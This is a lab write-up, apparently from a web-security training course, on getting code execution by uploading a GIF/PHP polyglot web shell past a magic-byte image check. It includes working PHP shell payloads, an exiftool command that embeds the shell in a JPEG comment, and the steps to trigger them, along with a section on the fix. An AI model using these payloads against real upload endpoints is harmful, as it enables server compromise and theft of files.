# Lab: Remote code execution via polyglot web shell upload

Changing the extension did not help, and spoofing the `Content-Type` did not either. This server opens the file and confirms it really is an image. The way through is a file that is a real image and real PHP at the same time.

## The setup

A blog with an avatar upload served from `/files/avatars/<name>`. Every extension trick from the earlier labs fails here. The validator is inspecting the bytes, which is the right idea done the wrong way: it is checking magic bytes, not the whole file.

## How the vulnerability works

An image check by magic bytes only reads the start of the file. If the first few bytes are `GIF89a`, the validator decides the file is a GIF and stops looking. Nothing later in the file has to be image data. PHP is equally willing to ignore leading bytes: it scans for `<?php` and runs whatever sits between the tags. Put the two together and you get a polyglot. The same bytes parse as an image for the validator and as a script for the interpreter.

## Solving it

1. Log in as `wiener:peter` and try to upload a plain shell:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The server rejects it as not a genuine image.
2. Prepend an image signature in front of the payload, keeping the `.php` extension:

```
GIF89a;<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Save that as `exploit.php` and upload it. It passes, because the file now begins with the GIF magic bytes.
4. Upload it as your avatar and go back to the account page. Find the `GET /files/avatars/exploit.php` request in Burp's history and send it. The response is image bytes with Carlos's secret printed out by the PHP.

## Why that payload works

The validator reads `GIF89a` and classifies the upload as a GIF, never inspecting the rest. When the server later executes the file as PHP, the interpreter ignores the leading `GIF89a;` and runs the code between `<?php` and `?>`. One byte stream, two readers, two conclusions. The image check and the script engine are looking at the same file with different rules, and the polyglot satisfies both.

## The fix

Magic bytes are not content validation. Decode the uploaded image with a real image library and re-encode it, so any smuggled metadata or code is dropped, then store it with a generated name and a safe extension. Keep uploads out of executable directories, and never serve a file the user could have turned into a script.

<Accordion title="The ExifTool route">
The published solution builds a genuine JPEG and hides the payload in its `Comment` field:

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" in.jpg -o polyglot.php
```

The `START` and `END` markers make the secret easy to spot inside the binary response. Same idea as the GIF header, done with real image metadata.
